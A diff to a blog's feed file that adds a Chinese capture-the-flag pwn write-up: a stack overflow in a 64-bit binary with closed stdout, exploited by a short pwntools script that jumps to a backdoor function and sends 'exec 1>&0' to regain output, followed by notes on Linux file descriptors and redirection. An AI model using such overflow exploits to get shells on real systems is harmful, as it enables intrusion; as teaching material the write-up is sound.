@@ -4,17 +4,19 @@
   
     
     <entry>
-      <title>一个wp和linux文件描述符与重定向</title>
-      <link href="/2024/07/10/%E4%B8%80%E4%B8%AAwp%E5%92%8Clinux%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/"/>
-      <url>/2024/07/10/%E4%B8%80%E4%B8%AAwp%E5%92%8Clinux%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E4%B8%8E%E9%87%8D%E5%AE%9A%E5%90%91/</url>
+      <title>一个wp和linux文件描述符及重定向</title>
+      <link href="/2024/07/10/%E4%B8%80%E4%B8%AAwp%E5%92%8Clinux%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%8F%8A%E9%87%8D%E5%AE%9A%E5%90%91/"/>
+      <url>/2024/07/10/%E4%B8%80%E4%B8%AAwp%E5%92%8Clinux%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%8F%8A%E9%87%8D%E5%AE%9A%E5%90%91/</url>
       
-        <content type="html"><![CDATA[]]></content>
+        <content type="html"><![CDATA[<p>在做题过程中遇到了好几次重定向，在此简单了解一下。<!--maore--></p><p>checksec一下<br><img src="/2024/07/10/%E4%B8%80%E4%B8%AAwp%E5%92%8Clinux%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%8F%8A%E9%87%8D%E5%AE%9A%E5%90%91/vuln_1.png"><br>64位，开启了NX</p><p>丢到ida里<br><img src="/2024/07/10/%E4%B8%80%E4%B8%AAwp%E5%92%8Clinux%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%8F%8A%E9%87%8D%E5%AE%9A%E5%90%91/vuln_2.png"><br>看到关闭了标准输出<br>并且存在栈溢出，又看到了后门函数<br><img src="/2024/07/10/%E4%B8%80%E4%B8%AAwp%E5%92%8Clinux%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%8F%8A%E9%87%8D%E5%AE%9A%E5%90%91/vuln_3.png"></p><p>exp如下  </p><figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context(arch = <span class="string">'amd64'</span>, os = <span class="string">'linux'</span>, log_level = <span class="string">'debug'</span>)</span><br><span class="line"></span><br><span class="line">io = remote(<span class="string">'node5.anna.nssctf.cn'</span>,<span class="number">24144</span>)</span><br><span class="line"><span class="comment">#io = process('./vuln')</span></span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">'./vuln'</span>)</span><br><span class="line"></span><br><span class="line">backdoor = elf.symbols[<span class="string">'b4ckd0or'</span>]</span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401233</span></span><br><span class="line">ret = <span class="number">0x000000000040101a</span></span><br><span class="line"></span><br><span class="line">payload = cyclic(<span class="number">0x10</span> + <span class="number">0x08</span>) + p64(ret) + p64(backdoor)</span><br><span class="line"></span><br><span class="line">io.sendline(payload)</span><br><span class="line">io.sendline(<span class="string">'exec 1&gt;&amp;0'</span>)</span><br><span class="line">io.interactive()</span><br></pre></td></tr></tbody></table></figure><p>打通<br><img src="/2024/07/10/%E4%B8%80%E4%B8%AAwp%E5%92%8Clinux%E6%96%87%E4%BB%B6%E6%8F%8F%E8%BF%B0%E7%AC%A6%E5%8F%8A%E9%87%8D%E5%AE%9A%E5%90%91/vuln_4.png"> </p><hr><ul><li>I/O重定向通常与FD有关，shell的FD通常为10个，即0～9</li><li>三个常用FD(默认与keyboard、monitor、monitor有关)</li></ul><table><thead><tr><th>FD</th><th>说明</th></tr></thead><tbody><tr><td>0</td><td>stdin，标准输入</td></tr><tr><td>1</td><td>stdout，标准输出</td></tr><tr><td>2</td><td>stderr，标准错误输出</td></tr></tbody></table><p>0是标准输入，1是标准输出，2是标准错误。如果此时再打开一个新的文件，它的文件描述符就是3。<br>用 &lt; 来改变读进的数据信道(stdin)，使之从指定的档案读进<br>用 &gt; 来改变送出的数据信道(stdout, stderr)，使之输出到指定的档案</p><p>我们可以修改文件描述符的指向，也就是重定向，例如：exec 1&gt;myputout，而exp中的exec 1&gt;&amp;0，将标准输出重定位到标准输入上，这样就相当于重新启动了标准输出。</p><p>参考文章：<a href="https://xstarcd.github.io/wiki/shell/exec_redirect.html">https://xstarcd.github.io/wiki/shell/exec_redirect.html</a></p>]]></content>
       
       
       
         <tags>
             
             <tag> PWN </tag>
+            
+            <tag> 知识 </tag>
             
         </tags>
       
